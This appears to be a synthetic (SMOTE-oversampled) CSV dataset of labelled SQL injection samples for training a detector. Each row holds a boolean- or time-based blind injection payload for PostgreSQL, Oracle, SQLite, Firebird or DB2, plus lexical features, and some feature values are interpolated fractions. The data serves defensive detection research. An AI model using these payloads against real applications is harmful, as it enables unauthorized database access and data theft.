id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000301,attack,boolean,"1'  )   as omtb where 1183  =  1183 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000127,0.5289090704937799,126.0,33.34674905464031,3.8745710615792412,43.0,21.0,47.0,15.0,0.3412698412698413,0.16666666666666666,0.373015873015873,0.11904761904761904,0.8266254726798432,0.17337452732015668,2.0,-1.3877787807814457e-17,1.0,2.0,0.0,7.0,0.0,1.0,1.0,5.0,0.8266254726798432,0.1733745273201568,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000302,attack,boolean,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ynpr'  =  'ynpr",nearest_attack_euclidean,R000036,0.04211159253003997,148.17921035829374,30.98506580347552,4.23602236423002,81.89546062432865,8.985065803475521,39.2688155374406,18.029868393048957,0.5527801065464761,0.06064936003757322,0.2648984584276922,0.12167207498825838,4.0,0.0,0.0,-1.3877787807814457e-17,1.0,2.0,0.0,4.059736786097911,0.0,0.0,2.985065803475522,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000303,attack,boolean,"1%'  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  '%'  =  '",nearest_attack_euclidean,R000069,0.3913038417910252,127.54761607334657,31.0,3.567102931259362,35.90476785330685,15.0,55.09523214669315,21.547616073346575,0.2817315853487996,0.11761503017261854,0.4317995976984195,0.16885378678016236,6.0,0.0,0.0,1.0,0.0,2.0,0.0,9.773808036673287,1.7738080366732867,0.0,1.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000304,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000066,2.323624778223984,156.82914501260203,35.14070346250785,3.93240397985295,46.70351731253925,24.0,58.27386904379317,27.851758656269624,0.2971958632152871,0.15409542755271424,0.37121788495822117,0.17749082427377746,2.2814069250156983,0.4296482687460754,0.8592965374921507,-1.3877787807814457e-17,0.0,2.0,0.0,11.14070346250785,0.0,2.0,1.0,10.0,0.5703517312539246,0.4296482687460754,0.4296482687460755,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.5703517312539246,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.5703517312539246
SMOTE_000305,attack,boolean,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (     (  ""ymss""  =  ""ymss",nearest_attack_euclidean,R000087,0.9408220597598151,129.3583243181167,27.820837840941653,3.975979274015954,72.84688514211872,4.794790539764586,33.74269593741045,17.973952698822934,0.5642339059784811,0.03700899516654736,0.2601249607365834,0.13863213811838807,0.0,3.0,0.0,-1.3877787807814457e-17,1.0,1.0,0.0,4.38437161929376,0.0,3.9739526988229343,3.7947905397645867,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000306,attack,boolean,"1' in boolean mode  )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000011,1.4452825414965689,135.82755114946198,29.557719615194,4.013945372517837,79.250354997522,8.0,34.904037306358,13.673158845581998,0.5835956109774998,0.05932618280456087,0.25662893991807056,0.1004492662998687,1.0,0.0,1.1154392303879992,-1.3877787807814457e-17,1.0,1.0,0.0,4.557719615193999,0.0,0.0,2.0,3.115439230387999,1.0,0.0,0.5577196151939996,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000307,attack,boolean,"1  )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000026,0.2926039727884933,109.48474135358899,33.114210873353,3.671665658775478,31.856581550147496,15.0,46.456843493411995,16.1713163100295,0.2902490205538053,0.13734997786734143,0.42461587859476246,0.1477851229840908,2.0,0.2284217467059979,1.8857891266470008,1.0,0.0,1.0,0.0,9.0571054366765,0.0,0.0,1.0,3.8857891266470013,1.0,0.05710543667649942,0.9428945633235006,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.05710543667649948,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0571054366764994
SMOTE_000308,attack,boolean,"1%""   )    )    and elt  (  7633  =  4110,4110  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000116,1.7030579799516117,67.42170112713536,19.017399749525474,3.006759008818744,7.034799499050948,12.508699874762737,33.89560150284715,13.982600250474526,0.1067894749329788,0.18685316963344195,0.4990333472485847,0.20732400818499458,0.0,4.0,0.4913001252372626,-1.3877787807814457e-17,0.0,2.0,0.0,4.982600250474525,2.0,0.0,0.5086998747627375,2.491300125237262,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.5086998747627374,0.4913001252372625,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000309,attack,boolean,"1""  )   as gtpi where 8100  =  8100 and make_set  (  2678  =  9169,9169  )  --",nearest_attack_euclidean,R000018,0.42164347921847367,76.01168282692026,28.289886723900093,3.909305002417333,19.579773447800186,21.0,25.715954689560036,9.715954689560037,0.2554040443836316,0.2775950842617537,0.3392509439674992,0.12774992738711544,0.0,0.8579773447800185,2.0,-1.3877787807814457e-17,0.0,2.0,0.0,3.0,0.0,0.8579773447800184,1.0,4.0,0.0,0.8579773447800185,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000310,attack,boolean,"1  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  7182  =  7182",nearest_attack_euclidean,R000145,0.8350623811310474,134.41918531300226,32.0,3.5789763468447346,36.96408236133434,21.03591763866566,58.946123542001516,17.473061771000754,0.274462537474968,0.15836944027169872,0.43781297728337165,0.12935504496996164,2.9820411806671707,0.0,0.0,1.0,0.0,2.0,0.0,10.491020590333585,0.0,0.0,1.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000311,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (     (  'vcgc' like 'vcgc",nearest_attack_euclidean,R000147,0.07667413937724757,135.42140839317298,28.884281678634597,3.9910202704200315,84.0,3.0,34.53712671453838,13.884281678634595,0.6203750390083896,0.022156251393156773,0.25495621572834337,0.10251249387011019,3.0,0.0,0.0,-1.3877787807814457e-17,1.0,0.0,0.0,4.884281678634596,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000312,attack,boolean,"-6041'   )    )    or make_set  (  9835  =  1367,1367  )   and    (    (   'hxjf'  =  'hxjf",nearest_attack_euclidean,R000088,0.41203669634194207,89.19973753272679,30.723036543496427,3.695561355562756,20.553926913007142,16.0,38.061255804475,14.584554815244642,0.23195443764850862,0.1798822484469388,0.4248499263029239,0.16331338760162872,4.0,0.0,1.0,-1.3877787807814457e-17,0.0,1.8615182717482144,0.0,5.723036543496429,0.0,1.0,1.0,2.8615182717482144,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000313,attack,boolean,"1' or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and 'xmnd'  =  'xmnd",nearest_attack_euclidean,R000009,0.5285530291549614,144.30902373445116,31.61278217304651,3.9136084705355354,47.49022573843721,16.98045147687442,53.348120780702324,26.49022573843721,0.32968582039853267,0.11707612624485286,0.3695548714913698,0.18368318186524468,4.0,0.0,0.0,-1.3877787807814457e-17,0.0,2.0,0.0,10.245112869218605,0.0,2.0,1.0,8.245112869218605,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.12255643460930238,0.0,0.12255643460930249,0.0,0.8774435653906976,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.122556434609302
SMOTE_000314,attack,boolean,"1' where 2332  =  2332 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000025,0.9987093516635291,136.5254632155624,32.0,4.228646409409034,69.0,16.0,37.0,14.525463215562395,0.5054069900239477,0.11719582377366905,0.27101534247660963,0.10638184372577351,0.5254632155623944,0.0,2.0,-1.3877787807814457e-17,1.0,2.0,0.0,4.0,0.0,0.0,2.0,5.0,0.5254632155623944,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000315,attack,boolean,"1'   )    )    as babx where 2494  =  2494 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000080,0.8469864224654039,157.0953591313792,32.0,4.038840312975572,71.96262826120686,18.0,46.34020521793098,20.792525652241373,0.4582217168322952,0.11473816505287561,0.29459998272956994,0.13244013538525926,0.7925256522413724,0.2074743477586275,2.0,-1.3877787807814457e-17,1.0,2.0,0.0,5.792525652241372,0.0,5.0,4.0,5.0,0.7925256522413724,0.2074743477586276,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.2074743477586276,0.7925256522413724,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000316,attack,boolean,"""   )    )    or    (    (   ""x""   )    )     =     (    (   ""x",nearest_attack_euclidean,R000004,2.1931323153894087,65.96833428916169,11.298149210179652,1.9257689498337558,4.329814921017963,3.957779052215587,44.02111047389221,13.659629842035931,0.06545524754574189,0.054969153502994236,0.6725719979174981,0.2070036010337658,0.0,4.0,0.3298149210179653,-1.3877787807814457e-17,0.0,1.3298149210179655,0.0,7.340370157964069,0.6596298420359308,0.0,0.0,1.659629842035931,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.3298149210179655,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.3298149210179653
SMOTE_000317,attack,boolean,"-5904"" where 9782  =  9782 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --",nearest_attack_euclidean,R000079,0.9968268697868482,145.78136884672844,37.50537563654533,4.332326790064771,56.67025042436356,26.0,43.61649405891022,19.494624363454665,0.39094565229752776,0.17921086399603925,0.2959721433994131,0.13387134030701991,4.0,0.8351252121817779,2.6702504243635556,-1.3877787807814457e-17,0.0,2.0,0.0,4.989248726909333,0.0,0.0,0.0,8.670250424363557,1.0,0.8351252121817779,0.835125212181778,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.8351252121817779,1.0,0.16487478781822218,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000318,attack,boolean,"-6041'   )    )    or make_set  (  9835  =  1367,1367  )   and    (    (   'hxjf'  =  'hxjf",nearest_attack_euclidean,R000088,0.016730792311087476,90.94057913144738,30.940579131447382,3.6402489695156737,19.968004147702434,15.981716655829963,40.0,14.990858327914982,0.21953744643730264,0.17572371788917565,0.4398952993437736,0.16484353632974819,4.0,0.0,1.0,-1.3877787807814457e-17,0.0,2.0,0.0,6.0,0.0,0.995429163957491,0.995429163957491,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000319,attack,boolean,"-4889""   )    )    as vvuo where 8060  =  8060 or   (  8459  =  8459  )  *4906--",nearest_attack_euclidean,R000056,0.527052738325461,78.72827308101948,22.726701096560298,3.5125287347985696,13.181675274140073,24.0,30.546597806879408,11.0,0.1678196013489645,0.30522627500950894,0.3870587475955016,0.13989537604602495,0.0,1.0,3.0,-1.3877787807814457e-17,0.818324725859926,2.0,0.0,3.818324725859926,0.0,0.181675274140074,0.181675274140074,5.818324725859926,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000320,attack,boolean,"-2790""   )    )    as vcvw where 6075  =  6075 or 7078  =  8148--",nearest_attack_euclidean,R000117,1.0783273712796417,71.16106460101223,22.58926235993252,3.5610989373467463,13.000000000000004,21.642950560269927,27.285901120539855,9.232212920202446,0.18459733849746943,0.30453278738409634,0.38186885046361485,0.12900102365481947,0.0,1.0,3.0,-1.3877787807814457e-17,0.4107376400674818,2.0,0.0,2.821475280134964,0.0,0.0,0.0,5.410737640067482,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000321,attack,boolean,"1""  )   as nqtn where 5606  =  5606 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000123,1.9961899027167176,152.21738189501448,33.0,4.119222255554823,72.048307087781,17.0241535438905,44.58453740361674,18.560383859726244,0.47420801723935496,0.11184362795709114,0.292562923642514,0.12138543116103989,0.0,1.0,2.0,-1.3877787807814457e-17,1.0,2.0,0.0,5.5120767719452495,0.0,2.5603838597262456,3.024153543890498,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000322,attack,boolean,"1' where 2332  =  2332 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000025,0.41115844112536726,141.51570624872133,32.79688933800965,4.242749633364253,70.85940845535583,16.26562977933655,38.59377867601929,15.796889338009647,0.5009553145901023,0.11508863303581221,0.2725029172154685,0.11145313515861702,1.0,0.0,2.0,-1.3877787807814457e-17,1.0,2.0,0.0,4.26562977933655,0.0,0.0,2.2656297793365487,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000323,attack,boolean,"-6561""   )    )     )   or 6872  =  6872 and    (    (     (  ""azqp"" like ""azqp",nearest_attack_euclidean,R000019,0.09326030038611263,79.05487995835784,23.97256002082107,3.2454953843265786,17.027439979178926,12.02743997917893,38.0,12.0,0.215382840922496,0.15213458334971733,0.4806867575531179,0.1517958181746688,0.0,4.0,0.9725600208210707,-1.3877787807814457e-17,0.02743997917892943,1.0,0.0,6.0,0.0,0.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0274399791789293,0.9725600208210707,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000324,attack,boolean,"1'  )   where 7007  =  7007 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R000149,1.1441468959727372,145.15995227623642,33.26398091049457,3.8432401640719984,41.0,24.0,54.527961820989134,25.631990455247283,0.2825257237076893,0.1653809114386474,0.37552232730747165,0.17657103754619163,0.6319904552472835,0.3680095447527165,2.0,-1.3877787807814457e-17,0.0,2.0,0.0,10.631990455247283,0.0,2.0,1.0,10.0,0.6319904552472835,0.3680095447527165,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000325,attack,boolean,"1%' or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000134,0.44660433592114374,128.75326535781196,30.511808912428904,4.0490521824462355,71.0,8.170602970809636,33.72964753295416,15.853014854048174,0.5534975869167537,0.06352648971367122,0.26023699132120265,0.12273893204837237,1.0,0.0,2.0,-1.3877787807814457e-17,1.0,1.0,0.0,4.511808912428905,1.0,0.0,2.170602970809635,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000326,attack,boolean,"1%""   )    )    and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000014,1.5345882756910882,158.3094807367538,35.32379229470152,4.003029045532956,59.64042881042918,15.99284422102614,58.33810385264924,24.33810385264924,0.3761069616562389,0.10085038683119235,0.3689988947680218,0.1540437567445469,4.0,4.0,0.33094807367538004,-1.3877787807814457e-17,0.0,1.66905192632462,0.0,8.0,1.3381038526492397,0.0,0.0,6.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.6690519263246197,0.33094807367538004,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_000327,attack,boolean,"1'  )   and make_set  (  4551  =  6487,6487  )   and   (  'jnqa'  =  'jnqa",nearest_attack_euclidean,R000062,0.4857835997913744,74.94360744909145,22.595596807532242,3.561448966778161,20.595596807532242,13.0,29.3480106415592,12.0,0.2754852197741851,0.1736291463399752,0.3906125757258626,0.1602730581599771,4.0,0.0,0.0,-1.3877787807814457e-17,0.13480106415591986,1.8651989358440804,0.0,4.26960212831184,0.0,0.8651989358440801,0.8651989358440803,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000328,attack,boolean,"1""   )    )    and   (  1248  =  8705  )  *8705 and    (    (   ""wvma"" like ""wvma",nearest_attack_euclidean,R000075,1.565423861146881,80.07881064122273,23.46059467938863,3.264711404316837,17.53940532061137,12.539405320611369,38.0,12.0,0.2189831597792642,0.15653497306354514,0.4746062190394649,0.14987564811772575,0.0,4.0,0.46059467938863125,-1.3877787807814457e-17,0.5394053206113687,1.0,0.0,6.0,0.0,0.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.539405320611369,0.4605946793886312,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000329,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  ""gzhp""  =  ""gzhp",nearest_attack_euclidean,R000118,0.19968462956082214,127.89732850541988,31.94866425270994,4.347547096261331,79.58931402167951,4.205342989160245,29.10267149458012,15.0,0.6222498706808895,0.03290517042353869,0.22756196829421374,0.117282990601358,0.0,2.897328505419877,0.10267149458012292,-1.3877787807814457e-17,1.0,1.0,0.0,3.0513357472900617,0.051335747290061406,0.0,2.9486642527099387,2.102671494580123,0.0,1.0,0.051335747290061406,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
